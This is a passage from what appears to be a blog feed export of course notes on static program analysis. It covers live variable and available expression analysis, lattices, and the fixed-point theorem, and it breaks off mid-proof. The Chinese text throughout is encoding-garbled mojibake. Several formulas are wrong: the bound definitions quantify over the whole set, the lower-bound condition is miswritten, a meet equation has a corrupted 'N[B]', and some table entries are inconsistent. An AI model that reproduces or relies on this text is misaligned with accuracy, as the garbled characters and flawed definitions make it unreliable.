title="éå†ç»“æœ"></a>éå†ç»“æœ</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802193730918.png" alt="image-20200802193730918"></p></li></ol><h2 id="ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹-fixed-point"><a href="#ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹-fixed-point" class="headerlink" title="ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹(fixed point)"></a>ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹(fixed point)</h2><p>å†æ¬¡è€ƒè™‘Transfer Functionï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><ul><li>å› ä¸º genå’Œkillæ˜¯ä¸å˜çš„</li><li>å½“æ–°çš„å˜åŒ–è¿›æ¥æ—¶ï¼Œç»è¿‡killsï¼Œå­˜åœ¨$survivor_s$åŠ å…¥OUT[S]</li><li>å› æ­¤é‚£äº›åŠ å…¥åˆ°OUT[S]çš„æ–°å˜åŒ–ï¼Œè¦ä¹ˆæ¥è‡ªäºgenï¼Œè¦ä¹ˆæ¥è‡ªäº$survivor_s$ï¼Œè€Œè¿™äº›å˜åŒ–å°†æ°¸è¿œä¿ç•™ï¼ˆé›†åˆä¸­æ°¸è¿œå­˜åœ¨è¿™äº›ä½ç½®ï¼‰</li><li>å› æ­¤OUTçš„å˜åŒ–æ˜¯å•è°ƒå¢çš„(åªä¼š0-&gt;1,1-&gt;1)</li></ul><p>æ€»ç»“ä¸‹æ¥ï¼Œæ¯ä¸ªBBçš„Transfer Functionæ˜¯ä¸€ä¸ªå•è°ƒå¢å‡½æ•°ï¼Œåˆå› ä¸ºå€¼åŸŸæ˜¯æœ‰ä¸Šé™çš„ï¼ˆæœ€å¤§ä¸åŠ¨ç‚¹ï¼‰ï¼Œå› æ­¤ç®—æ³•æœ€ç»ˆä¼šåœæ­¢ã€‚</p><h1 id="Live-Variable-Analysis"><a href="#Live-Variable-Analysis" class="headerlink" title="Live Variable Analysis"></a>Live Variable Analysis</h1><blockquote><p>Live variables analysis tells whether the value of variable $v$ at program point $p$ could be used along some path in CFG starting at $p$. If so , $v$ is live at $p$; otherwise, $v$ is dead at $p$.</p></blockquote><p>å¯¹äºåœ¨CFGç¨‹åºç‚¹ $p$ä¸Šå®šä¹‰çš„<strong>å˜é‡ $v$ </strong>ï¼Œåœ¨$p$ä¸Šå˜é‡$v$çš„å€¼åœ¨åç»­æ‰§è¡Œä¸­è¿˜è¢«è¯»å–ï¼ˆ$v$ åœ¨ä½¿ç”¨å‰ä¸è¢«é‡æ–°å®šä¹‰ï¼‰ï¼Œé‚£ä¹ˆç§° $v$ åœ¨ $p$ ä¸Šæˆæ´»ã€‚<br>ï¼ˆä½¿ç”¨åœºæ™¯ï¼šå¯„å­˜å™¨ç”¨å®Œä¹‹åï¼Œæ£€æŸ¥å“ªä¸ªå¯„å­˜å™¨å¯ä»¥è¢«æ¸…é™¤â€”â€”è‹¥å¯„å­˜å™¨ä¸­çš„å˜é‡deadï¼‰</p><h2 id="ç®—æ³•è®¾è®¡-1"><a href="#ç®—æ³•è®¾è®¡-1" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Valuesï¼Œä¾ç„¶ç”¨bit vectorï¼Œ<strong>æ³¨æ„è¿™æ¬¡è®°å½•å˜é‡</strong><br> å¦‚ï¼šV1,V2,â€¦,Vn=01â€¦0 ï¼ˆV2åœ¨pä¸Šçš„å®šä¹‰è¢«ä½¿ç”¨i.e.,ä¸èƒ½æ¸…ç©ºV2å¯„å­˜å™¨ï¼‰</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> è®¨è®ºforwardè¿˜æ˜¯backwardï¼Œ<strong>æŠŠå˜é‡å½“å¯„å­˜å™¨æƒ³</strong>ï¼Œå½“å†³å®šä¸€ä¸ªå¯„å­˜å™¨æ˜¯å¦å¯ä»¥æ¸…ç©ºçš„æ—¶å€™ï¼Œéœ€è¦å¾€åçœ‹ï¼Œåé¢çš„ç¨‹åºæ˜¯å¦ç”¨åˆ°è¿™ä¸ªå¯„å­˜å™¨ï¼Œå› æ­¤ç”¨backwardã€‚</p><p> <strong>Transfer Functionï¼š</strong></p><script type="math/tex; mode=display">\mathrm{IN}[B]=use_{B} \cup\left(\mathrm{OUT}[B]-def_{B}\right)</script><p> å…¶ä¸­ï¼Œ$IN[B]$æŒ‡våœ¨Bä¸­é‡å®šä¹‰å‰è¢«ä½¿ç”¨ï¼Œ$OUT[B]$æŒ‡våœ¨Bä»£ç å—ä¸­æ²¡æœ‰é‡å®šä¹‰ï¼Œ$def_B$æŒ‡våœ¨Bä¸­è¢«é‡å®šä¹‰ã€‚</p><p> <strong>Control-flow Handingï¼š</strong></p><p> may analysisï¼Œä¾æ—§æ˜¯âˆªï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[\mathrm{B}]=\bigcup_{S \text{ a successor of B}}  {\mathrm{IN}[\mathrm{S}]}</script></li><li><p>ä¸åŠ¨ç‚¹ç®—æ³•<br>  <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802203143027.png" alt="image-20200802203143027"></p><h2 id="åˆ†æç»“æœ"><a href="#åˆ†æç»“æœ" class="headerlink" title="åˆ†æç»“æœ"></a>åˆ†æç»“æœ</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802202534370.png" alt="image-20200802202534370"></p></li></ol><h1 id="Avaliable-Expression-Analysis"><a href="#Avaliable-Expression-Analysis" class="headerlink" title="Avaliable Expression Analysis"></a>Avaliable Expression Analysis</h1><blockquote><p>An expression $x \text{ op } y$ is available at program point $p$ if (1) all paths from the entry to $p$ must passthrough the evaluation of , $x \text{ op } y$and (2) after the last evaluation of $x \text{ op } y$, there is no redefinition of $x \text{ op } y$.</p></blockquote><p>è¡¨è¾¾å¼ $x \text{ op } y$ ä¸ºavailbable å½“ä¸”ä»…å½“ ï¼ˆ1ï¼‰æ‰€æœ‰è·¯å¾„éƒ½ç»è¿‡ $x \text{ op } y$ ï¼ˆ2ï¼‰æœ€åä¸€ä¸ªè®¡ç®—  $x \text{ op } y$ åï¼Œä¸å†æœ‰ $x$ å’Œ$y$ çš„é‡æ–°èµ‹å€¼ã€‚</p><p>å¦‚æœè¡¨è¾¾å¼availableï¼Œåˆ™ä¼˜åŒ–æœ€åä¸€æ¬¡çš„è®¡ç®—ï¼Œä¾‹å¦‚ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802204136008.png" alt="image-20200802204136008"></p><p>cå¯ä»¥è¢«ä¼˜åŒ–ï¼Œä¾‹å¦‚ï¼Œå°†aï¼Œbï¼Œcå…¨è½¬åŒ–ä¸ºyï¼Œæœ€åä¸€æ­¥åˆ™ä¸ç”¨è®¡ç®—ï¼ˆä¸è®ºèµ°ä»€ä¹ˆåˆ†æ”¯ï¼Œæœ€åçš„téƒ½ä¸ç”¨è®¡ç®—ï¼‰</p><h2 id="ç®—æ³•è®¾è®¡-2"><a href="#ç®—æ³•è®¾è®¡-2" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Values<br> availableçš„è¡¨è¾¾å¼é›†åˆï¼Œå¯ç”¨bitVectorè¡¨ç¤ºï¼Œå¦‚ï¼š</p><p>E1,E2,â€¦,En=01â€¦0(E2ä¸ºavailable)</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> <strong>Transfer Functionï¼š</strong></p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-kill_{B}\right)</script><p> è¿™é‡Œçš„$kill_{B}$æŒ‡åˆ é™¤è¡¨è¾¾å¼ï¼Œè¿™äº›è¡¨è¾¾å¼çš„å˜é‡åœ¨å½“å‰å—Bä¸­è¢«é‡æ–°å®šä¹‰ã€‚</p><p> <strong>Control-flow Handingï¼š</strong></p><script type="math/tex; mode=display">\mathrm{N}[B]=\bigcap_{P a \text { predecessor of } B} OUT [P]</script><p> must analysisï¼Œç”±â€œâˆªâ€å˜æˆäº†â€œâˆ©â€</p></li><li><p>ç®—æ³•ï¼Œæ³¨æ„æ¯ä¸ªbbçš„åˆå§‹åŒ–ï¼Œå˜æˆäº†â€œAllâ€ï¼Œå³åˆå§‹çŠ¶æ€æ‰€æœ‰è¡¨è¾¾å¼éƒ½æ˜¯availableçš„ï¼ˆåå‘æ€ç»´ï¼Œå¦‚æœåˆå§‹åŒ–ä¸º0ï¼Œé‚£ä¹ˆ$\cap$åæ’ä¸º0ï¼Œè®¡ç®—æ— æ•ˆï¼‰<br> <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802205253641.png" alt="image-20200802205253641"></p></li></ol><h1 id="ç»¼åˆæ¯”è¾ƒ"><a href="#ç»¼åˆæ¯”è¾ƒ" class="headerlink" title="ç»¼åˆæ¯”è¾ƒ"></a>ç»¼åˆæ¯”è¾ƒ</h1><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available</th></tr></thead><tbody><tr><td>Domain(ç ”ç©¶å¯¹è±¡çš„é›†åˆ)</td><td>å®šä¹‰é›†åˆ</td><td>å˜é‡é›†åˆ</td><td>è¡¨è¾¾å¼é›†åˆ</td></tr><tr><td>Direction(æ•°æ®çŠ¶æ€çš„ä¾èµ–å…³ç³»)</td><td>Forwards</td><td>Backwards</td><td>Forwards</td></tr><tr><td>May/Must(åº”ç”¨åœºæ™¯)</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary(Direction&amp;May/Must)</td><td>$\mathrm{OUT}[entry]=\emptyset$</td><td>$\mathrm{IN}[exit]=\emptyset$</td><td>$\mathrm{OUT}[entry]=\emptyset$</td></tr><tr><td>Initialization(Direction&amp;May/Must)</td><td>$\mathrm{B}[entry]=\emptyset$</td><td>$\mathrm{In}[B]=\emptyset$</td><td>$\mathrm{OUT}[B]=\emptyset$</td></tr><tr><td>Transfer function</td><td>$\mathrm{OUT}=gen \cup (\mathrm{IN}-kill)$</td><td>-</td><td>-</td></tr><tr><td>Meet(May/Must)</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div><h1 id="å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£"><a href="#å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£" class="headerlink" title="å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£"></a>å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£</h1><p>æ•°æ®æµçš„transferå’Œcontrol-flow handingå®šä¹‰äº†ä¸€ç»„æ–¹ç¨‹ï¼š</p><ul><li>$\mathrm{D}_{\mathrm{v}_{1}}=\mathrm{F}_{\mathrm{v}_{1}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)$</li><li>$\mathrm{D}_{\mathrm{v}_{2}}=\mathrm{F}_{\mathrm{v}_{2}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)$</li><li>â€¦</li><li>$D_{v_{n}}=F_{v_{n}}\left(D_{v_{1}}, D_{v_{2}}, \ldots, D_{v_{n}}\right)$</li></ul><p>å…¶ä¸­ï¼š</p><ul><li>$F_{v_{1}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)=f_{v_{1}}(I)$</li><li>$F_{v_{i}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)=f_{v_{i}}\left(\sqcap_{j \in \operatorname{pred}(i)} D_{v_{j}}\right)$</li></ul><p>æ•°æ®æµåˆ†æå³ä½¿æ±‚è¯¥æ–¹ç¨‹çš„æœ€å¤§è§£ï¼ˆUnificationç®—æ³•ï¼‰ï¼Œå¯¹äºå•è°ƒå‡½æ•°å’Œæœ‰é™æ ¼ï¼ŒUnificationç®—æ³•å°±æ˜¯ä¸Šè¿°çš„ä¸åŠ¨ç‚¹ç®—æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ•°æ®æµåˆ†æ </tag>
            
            <tag> PL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Iterative-Algorithm"><a href="#Iterative-Algorithm" class="headerlink" title="Iterative Algorithm"></a>Iterative Algorithm</h1><ul><li><p>å¯¹äºä¸€ä¸ªå« $k$ ä¸ªèŠ‚ç‚¹çš„CFGï¼Œæ¯ä¸ªè¿­ä»£ç®—æ³•å¯¹äºæ¯ä¸ªnode $n$ æ›´æ–°$\mathrm{OUT}[n]$ã€‚</p></li><li><p>å‡è®¾è¿­ä»£ç®—æ³•çš„ç ”ç©¶å¯¹è±¡ï¼ˆdomainï¼‰æ˜¯$V$ï¼Œå®šä¹‰ä¸€ä¸ªkå…ƒç»„<br>  <script type="math/tex">V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$ï¼Œ$V^k\in(V_1 \times V_2 \times \dots \times V_k)</script>ï¼Œ<br>  $ V^k $ å³ä¸€æ¬¡è¿­ä»£äº§ç”Ÿçš„è¾“å‡ºï¼Œæ¯æ¬¡è¿­ä»£ä¼šæ›´æ–°$V^k$ï¼Œå¯ä»¥å°†æ¯æ¬¡è¿­ä»£ç»è¿‡transfer functionså’Œcontrol-flow handingçš„è¿‡ç¨‹æŠ½è±¡ä¸º$F: V^k\rightarrow {V^{k}}â€™$</p></li><li><p>å½“$V^k\rightarrow {V^{k}}â€™$æ—¶ï¼Œå³$X=F(X)$ ï¼Œç§°$F(x)$åœ¨$X$å¤„åˆ°è¾¾äº†<strong>ä¸åŠ¨ç‚¹</strong>ï¼Œ$X$ä¸º$F(x)$çš„ä¸åŠ¨ç‚¹ï¼Œ</p></li></ul><a id="more"></a><h1 id="Poset-amp-partial-orderï¼ˆååºé›†å’Œååºï¼‰"><a href="#Poset-amp-partial-orderï¼ˆååºé›†å’Œååºï¼‰" class="headerlink" title="Poset &amp; partial orderï¼ˆååºé›†å’Œååºï¼‰"></a>Poset &amp; partial orderï¼ˆååºé›†å’Œååºï¼‰</h1><blockquote><p>We define <strong>poset</strong> as a pair (P, âŠ‘) where âŠ‘ is a binary relation that defines a partial ordering over P, and âŠ‘ has the following properties: </p><p>(1) $\forall x \in P, x \sqsubseteq x$  (Reflexivity, è‡ªåæ€§)<br>(2) $\forall x, y \in P, x \sqsubseteq y \wedge y \sqsubseteq x \Rightarrow x=y \quad$ (Antisymmetryï¼Œåå¯¹ç§°æ€§)<br>(3) $\forall x,y,z \in P, x \sqsubseteq y \wedge y \sqsubseteq z \Rightarrow x \sqsubseteq z $ (Transitivityï¼Œä¼ é€’æ€§)</p></blockquote><p><strong>ååºé›†</strong>ä¸ºä¸€ä¸ªäºŒå…ƒç»„$(P, \sqsubseteq)$ï¼Œ$P$ä¸ºä¸€é›†åˆï¼Œ$\sqsubseteq$ä¸ºåœ¨é›†åˆä¸Šçš„ä¸€ç§æ¯”è¾ƒå…³ç³»ï¼Œè¿™ä¸ªäºŒå…ƒç»„ä¸ºååºé›†å½“ä¸”ä»…å½“é›†åˆå…ƒç´ åœ¨å…³ç³»ä¸Šæ»¡è¶³è‡ªåæ€§ã€åå¯¹ç§°æ€§å’Œä¼ é€’æ€§ã€‚</p><p><strong>ååº</strong>çš„å«ä¹‰ï¼šä¸€ä¸ªé›†åˆä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ ä¸ä¸€å®šå­˜åœ¨é¡ºåºå…³ç³»ï¼ˆä»»æ„ä¸¤å…ƒç´ ä¸ä¸€å®šèƒ½æ¯”è¾ƒå¤§å°ï¼‰</p><h1 id="Uppper-and-Lower-Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰"><a href="#Uppper-and-Lower-Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰" class="headerlink" title="Uppper and Lower Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰"></a>Uppper and Lower Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰</h1><blockquote><p>Given a poset (P, âŠ‘) and its subset $S$ that  $S\subseteq P$, we say that $u\in P$ is an <strong>upper bound</strong> of $S$, if $\forall x \in P, x\sqsubseteq u$. Similarly, $lâˆˆP$ is an <strong>lower bound</strong> of $S$, if $\forall x \in P, l\sqsubseteq u$.</p></blockquote><p>å¦‚å›¾ï¼Œ$\{a,b,c\}$æ˜¯$S$çš„ä¸Šç•Œï¼ˆç°è‰²ï¼‰ï¼Œ$\{\}$æ˜¯$S$çš„ä¸‹ç•Œï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200804204606009.png" alt="image-20200804204606009"></p><h2 id="æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ"><a href="#æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ" class="headerlink" title="æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ"></a>æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ</h2><blockquote><p>We define the <strong>least upper bound (lub or join)</strong> of $S$, written $âŠ”S$, if for every upper bound of $S$, say $u, âŠ”SâŠ‘u$. Similarly, We define the <strong>greatest lower bound (glb or meet)</strong> of $S$, written $âŠ“S$, if for every lower bound of $S$, say $l, lâŠ‘âŠ“S$.</p></blockquote><p>ç‰¹åˆ«çš„ï¼Œå¯¹äºä»…æœ‰ä¸¤ä¸ªå…ƒç´ çš„é›†åˆ$S=\{a,b\}$ï¼Œ$\sqcup S$ å¯ä»¥å†™ä¸º$a \sqcup b$ï¼ŒåŒç† $\sqcap S$å¯ä»¥å†™ä¸º $a\sqcap b$ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>ï¼ˆæœ€å°ï¼‰ä¸Šç•Œå’Œï¼ˆæœ€å¤§ï¼‰ä¸‹ç•Œæ˜¯é’ˆå¯¹é›†åˆä¸­çš„ç‰¹å®šå­é›†çš„ï¼Œè€Œä¸Šä¸‹ç•Œæœ¬èº«ä¸ä¸€å®šåœ¨å­é›†ä¸­ï¼Œå¹¶ä¸”ï¼š</p><ul><li>ä¸æ˜¯æ‰€æœ‰ååºé›†å‡å­˜åœ¨lubæˆ–è€…glbï¼ˆå¦‚å…ˆå‰ç°è‰²çš„é›†åˆå°±ä¸å«lubï¼‰</li><li>å¦‚æœä¸€ä¸ªååºé›†å­˜åœ¨lubå’Œglbï¼Œé‚£ä¹ˆå®ƒæ˜¯å”¯ä¸€çš„<ul><li>è¯æ˜ï¼š è®¾$g_1$ å’Œ$g_2$ åŒä¸º P çš„glbï¼Œé‚£ä¹ˆæ ¹æ®å®šä¹‰ $g_1\sqsubseteq (g_2 = \sqcap P)$ å¹¶ä¸”$g_2\sqsubseteq (g_1 = \sqcap P)$ï¼Œåˆå› ä¸ºåå¯¹ç§°æ€§ï¼Œæ‰€ä»¥$g_1=g_2$</li></ul></li></ul><h1 id="Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="Lattice, Semilattice, Complete and Product Lattice"></a>Lattice, Semilattice, Complete and Product Lattice</h1><h2 id="Latticeï¼ˆæ ¼ï¼‰"><a href="#Latticeï¼ˆæ ¼ï¼‰" class="headerlink" title="Latticeï¼ˆæ ¼ï¼‰"></a>Latticeï¼ˆæ ¼ï¼‰</h2><blockquote><p>Given a poset $(P, âŠ‘), âˆ€a,bâˆˆP$, if $aâŠ”b$ and $aâŠ“b$ exist, then $(P,âŠ‘)$ is called a lattice. </p></blockquote><p>å¦‚æœä¸€ä¸ªååºé›†çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ éƒ½æœ‰æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆè¿™ä¸€ååºé›†æ˜¯ä¸€ä¸ª<strong>æ ¼</strong></p><h2 id="Semilattice"><a href="#Semilattice" class="headerlink" title="Semilattice"></a>Semilattice</h2><p>æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œåªå­˜åœ¨ä¸€ä¸ªçš„ååºé›†ç§°<strong>åŠæ ¼</strong>ï¼Œåªå­˜åœ¨æœ€å°ä¸Šç•Œç§°ä¸ºâ€œjoin semilatticeâ€ï¼Œåªå­˜åœ¨æœ€å¤§ä¸‹ç•Œç§°ä¸ºâ€œmeet semilatticeâ€ã€‚</p><h2 id="Complete-Latticeï¼Œtop-amp-bottomï¼ˆå…¨æ ¼ï¼Œ-top-å’Œ-perp-ï¼‰"><a href="#Complete-Latticeï¼Œtop-amp-bottomï¼ˆå…¨æ ¼ï¼Œ-top-å’Œ-perp-ï¼‰" class="headerlink" title="Complete Latticeï¼Œtop &amp; bottomï¼ˆå…¨æ ¼ï¼Œ$\top$ å’Œ $\perp$ï¼‰*"></a>Complete Latticeï¼Œtop &amp; bottomï¼ˆå…¨æ ¼ï¼Œ$\top$ å’Œ $\perp$ï¼‰*</h2><blockquote><p>Given a lattice $(P,âŠ‘)$, for arbitrary subset $S$ of $P$, if $âŠ”S$ and $âŠ“S$ exist, then $(P,âŠ‘)$ is called a complete lattice.</p></blockquote><p>ä¸€ä¸ªååºé›†çš„ä»»æ„å­é›†å‡å­˜åœ¨æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆè¿™ä¸ªååºé›†æˆä¸º<strong>å…¨æ ¼</strong>ã€‚</p><p>æ¯ä¸ªå…¨æ ¼éƒ½å­˜åœ¨ä¸€ä¸ªæœ€å¤§å…ƒç´  topï¼ˆ$\top=\sqcup P$ï¼‰å’Œæœ€å°å…ƒç´ bottomï¼ˆ$\perp=\sqcap P$ï¼‰</p><p>æ‰€æœ‰å…ƒç´ æœ‰é™çš„æ ¼ï¼ˆfinite latticeï¼‰å‡æ˜¯å…¨æ ¼ã€‚ï¼ˆåä¹‹ä¸æˆç«‹ï¼‰</p><h2 id="Product-Lattice"><a href="#Product-Lattice" class="headerlink" title="Product Lattice"></a>Product Lattice</h2><blockquote><p>Given lattices $L_1=(P_1,âŠ‘_1),L_2=(P_2,âŠ‘_2),â€¦,L_n=(P_n,âŠ‘)n)$, if for all $i$, $(P_i,âŠ‘_i)$ has $âŠ”i$(least upper bound) and $âŠ“_i$(greatest lower bound), then we can have a product lattice $L^n=(P,âŠ‘)$ that is defined by:</p><ul><li>$P=P_{1} \times \ldots \times P_{n}$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqsubseteq\left(y_{1}, \ldots, y_{n}\right) \Leftrightarrow\left(x_{1} \sqsubseteq y_{1}\right) \wedge \ldots \wedge\left(x_{n} \sqsubseteq y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcup\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcup_{1} y_{1}, \ldots, x_{n} \cup_{n} y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcap\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcap_{1} y_{1}, \ldots, x_{n} \sqcap_{n} y_{n}\right)$</li></ul></blockquote><p>Product Latticeä»æ˜¯Latticeï¼Œè‹¥æ¯ä¸ªå­æ ¼ä¸ºå…¨æ ¼ï¼Œé‚£ä¹ˆä¹˜ç§¯ä¹Ÿæ˜¯å…¨æ ¼ã€‚</p><h1 id="Data-Flow-Analysis-Framework-via-Lattice"><a href="#Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="Data Flow Analysis Framework via Lattice"></a>Data Flow Analysis Framework via Lattice</h1><p>ä¸€ä¸ªæ•°æ®æµåˆ†ææ¡†æ¶å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªä¸‰å…ƒç»„$(D,L,F)$ ï¼Œå…¶ä¸­ï¼š</p><ul><li>Dï¼šæŒ‡æ•°æ®æµåˆ†æçš„æ–¹å‘ï¼Œi.e., forward or backwardï¼›</li><li>Lï¼šæŒ‡latticeï¼Œè¯¥æ ¼è¡¨ç¤ºæ‰€æœ‰domainå€¼åŸŸï¼Œä»¥åŠmeetï¼ˆ$\sqcap$ï¼‰æˆ–joinï¼ˆ$\sqcup$ï¼‰æ“ä½œï¼›</li><li>Fï¼šä¸€ç»„transfer functionã€‚</li></ul><h1 id="Monotonicity-and-Fixed-Point-Theorem"><a href="#Monotonicity-and-Fixed-Point-Theorem" class="headerlink" title="Monotonicity and Fixed Point Theorem"></a>Monotonicity and Fixed Point Theorem</h1><h2 id="Monotonicityï¼ˆå•è°ƒæ€§ï¼‰"><a href="#Monotonicityï¼ˆå•è°ƒæ€§ï¼‰" class="headerlink" title="Monotonicityï¼ˆå•è°ƒæ€§ï¼‰"></a>Monotonicityï¼ˆå•è°ƒæ€§ï¼‰</h2><blockquote><p>A function $f: Lâ†’L$ ($L$ is a lattice) is monotonic if $âˆ€x,yâˆˆL$,  $xâŠ‘yâŸ¹f(x)âŠ‘f(y)$</p></blockquote><p>æ™®é€šå‡½æ•°çš„å•è°ƒæ€§çš„æ¨å¹¿</p><h2 id="Fixed-Point-Theorem"><a href="#Fixed-Point-Theorem" class="headerlink" title="Fixed-Point Theorem"></a>Fixed-Point Theorem</h2><blockquote><p>Given a complete lattice ($L,âŠ‘$), if (1) $f:Lâ†’L$ is monotonic and (2) $L$ is finite, then the <strong>least fixed point</strong> of $f$ can be found by iterating $f(âŠ¥), f(f(âŠ¥)), \dots, f^k(âŠ¥)$ until a fixed point is reached the greatest fixed point of $f$ can be found by iterating $f(\top),f(f(\top)),\dots, f^k(\top)$ until a fixed point is reached.</p></blockquote><p>å¦‚æœfå•è°ƒä¸”Læœ‰ç•Œï¼Œé‚£ä¹ˆfå­˜åœ¨ä¸åŠ¨ç‚¹ï¼Œä»$âŠ¥$å¼€å§‹è¿­ä»£æ‰§è¡Œ$f$å¯å¾—æœ€å°ä¸åŠ¨ç‚¹ï¼Œä»$\top$å¼€å§‹è¿­ä»£å¯å¾—æœ€å¤§ä¸åŠ¨ç‚¹ã€‚</p><p>è¯æ˜ï¼š<br>(1) Existence<br>ç”±$\perp$å®šä¹‰ä»¥åŠ$f:L\rightarrow L$å¯å¾—</p><script type="math/tex; mode=display">\perp \sqsubseteq f(\perp)</script><p>åˆå› $f$æ˜¯å•è°ƒçš„ï¼Œå› æ­¤</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(f(\perp))=f^2(\perp)</script><p>ç”±äºLæ˜¯æœ‰é™(finite)çš„ï¼Œå› æ­¤æ€»ä¼šå­˜åœ¨ä¸€ä¸ªkï¼Œæœ‰</p><script type="math/tex; mode=display">f^{Fix}=f^k(\perp)=f^{k+1}(\perp)</script><p>ï¼ˆ2ï¼‰Least Fixed Pointï¼ˆæ•°å½’æ³•ï¼Œè¯æ˜æœ€å°ï¼‰</p><p>å‡è®¾æˆ‘ä»¬æœ‰å¦ä¸€ä¸ªä¸åŠ¨ç‚¹xï¼Œi.e., 